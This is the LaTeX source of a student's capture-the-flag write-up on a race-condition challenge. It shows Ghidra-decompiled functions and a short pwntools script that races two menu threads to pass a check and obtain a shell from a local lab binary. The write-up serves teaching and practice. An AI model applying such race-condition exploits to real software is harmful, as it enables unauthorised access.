\documentclass{article}

% Language setting
% Replace `english' with e.g. `spanish' to change the document language
\usepackage[english]{babel}

% Set page size and margins
% Replace `letterpaper' with`a4paper' for UK/EU standard size
\usepackage[a4paper,top=2cm,bottom=2cm,left=3cm,right=3cm,marginparwidth=1.75cm]{geometry}

% Useful packages
\usepackage{amsmath}
\usepackage{graphicx}
\usepackage{listings}
\usepackage{xcolor}
\usepackage[colorlinks=true, allcolors=blue]{hyperref}

\usepackage{algorithm, algpseudocode}
\usepackage{csquotes}
\usepackage{subfig}

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},   
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2
}

\lstset{style=mystyle}
\newcommand{\code}[1]{\lstinline|#1|}
\setlength\parindent{0pt}

\begin{document}
\begin{titlepage}
  \begin{center}
    \vfill

    \includegraphics[width=4cm]{sjtu.png}

    \vspace{1cm}

    \textbf{\huge Shanghai Jiao Tong University}

    \vspace{0.5cm}

    {\large race 1}

    \vspace{1.5cm}

    Ng Tze Kean\\Student number: 721370290002

  \end{center}
\end{titlepage}

\subsection*{Problem}

The problem that we are tackling this time is a race condition in the given
program. What we first try to do is to examine the behavior of the program. We
test the different menu options of the program and we can guess that there is a
type of sequence that we have to input fast enough to cause a race condition.

\begin{lstlisting}[language=bash]

\end{lstlisting}

It is likely that the race condition is the case statement for switching
between the different menu options or that there is some variable that is
checked against that is not well protected against modification.

\begin{lstlisting}[language=bash]
  if (choice == 4) {
    menu_exit();
  }
  else if (choice < 5) {
    if (choice == 3) {
      menu_test();
    }
    else if (choice < 4) {
      if (choice == 1) {
        menu_go();
      }
      else if (choice == 2) {
                    /* creates a new thread to run menu_chance */
        ret1 = pthread_create(&th1,(pthread_attr_t *)0x0,menu_chance,&pstr1);
      }
    }
  }
\end{lstlisting}

To investigate further we use ghidra to examine the nature of the program by
decompiling the program. Through examination, we can see that
\code{menu_chance} is being created in another thread. It is very likely that
the exploit will make use of the race condition between \code{menu_go} and
\code{menu_chance}. There is also a function \code{menu_test} that performs a
check, and if the check is successful, it will return that we "win" instead of
"lose".

\subsection*{Idea and Attack process}

Now that we narrow down the problem, we want to strategic our approach. We take
a look at the \code{menu_go} and \code{menu_chance} in ghidra and we notice
that there are a few checks before variable \code{a} and \code{b} is modified.

\begin{lstlisting}[language=bash]
void menu_go(void)
{
  int in_GS_OFFSET;
  if (a_sleep == 0) {
    a = a + 5;
  }
  else {
    a_sleep = 0;
  }
  b = b + 2;
  if (*(int *)(in_GS_OFFSET + 0x14) != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}

undefined4 menu_chance(void)
{
  int iVar1;
  undefined4 uVar2;
  int in_GS_OFFSET;
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  if (b < a) {
    if (flag == 1) {
      a_sleep = 1;
      FUN_00011110(1);
      flag = 0;
    }
    else {
                    /* enters here if Chance is selected more than once */
      FUN_00011130("Only have one chance");
    }
  }
  else {
                    /* prints "No" if Go has never been selected */
    FUN_00011130(&DAT_00012008);
  }
  uVar2 = 0;
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar2 = __stack_chk_fail_local();
  }
  return uVar2;
}
\end{lstlisting}

We can guess that \code{menu_chance} is manipulating some value that is checked
in \code{menu_test}. Through examination of \code{menu_test} we can see that
there a check on \code{a<b} before we can win. In \code{menu_go}, it is likely
that \code{a_sleep} is initialized to 0. Thus, causing \code{a<b} to be false as the if
loop would be executed. We are also not able to call \code{menu_chance} first
as there is a check that \code{menu_go} is first called. We now assume that
\code{a} is minimally 5, then b must be at least 6 for us to win. Then, we must
call \code{menu_go} at least 2 more times without running the \code{if} segment
of the code such that only b is incremented. By doing so, we are able to
increment \code{b} to 6 on the 3rd call.

\begin{lstlisting}[language=bash]
  if (a < b) {
    apcStack_2c[0] = "Win!";
    ppcVar3 = apcStack_2c;
    FUN_00011130();
    apcStack_2c[0] = "/bin/sh";
    FUN_00011140();
    apcStack_2c[0] = (char *)0x0;
    FUN_00011150();
  }
  \end{lstlisting}

We note that \code{menu_chance} is called through spawning another thread and
this is likely where the race condition can be exploited. We can see that there
is a check for \code{flag==1} and since this is not a protected variable,
assuming that \code{b<a} then we can call \code{menu_chance} again and still
get to set \code{a_sleep=1}.

Now we can formulate our attack. We first call \code{menu_go} and we will
having \code{a=5} and \code{b=2} we will call \code{menu_chance}, allowing us
to update \code{a_sleep=1}, we quickly call \code{menu_go} to update \code{b=4}
and before the first thread for \code{menu_chance} updates \code{flag}, we call
\code{menu_chance} again, allowing us to set \code{a_sleep=1} once again. Now,
we can call \code{menu_go} one more time, setting \code{b=6}. With that, we can
now call \code{menu_test} allowing us to fulfill the check condition.

\begin{lstlisting}[language=python]
  from pwn import *

  race = process('./race')
  # wait for prompt for choice 1
  race.recvregex(b'>')
  # send choice 1 go
  race.sendline(b'1')
  # wait for prompt for choice 2
  race.recvregex(b'>')
  # send choice 2 chance
  race.sendline(b'2')
  # wait for prompt for choice 3
  race.recvregex(b'>')
  race.sendline(b'1')
  race.recvregex(b'>')
  race.sendline(b'2')
  race.recvregex(b'>')
  race.sendline(b'1')
  race.recvregex(b'>')
  # send choice 3 test
  race.sendline(b'3')
  # wait for response
  print(race.recvline())
\end{lstlisting}

we create a python program that aids us in calling the required choices fast
enough such that the race condition happens. Running the above python code
allows us to `win' the CTF. Running the above in python3 with pwntools package
installed will allow us to run the exploit successfully.

\end{document}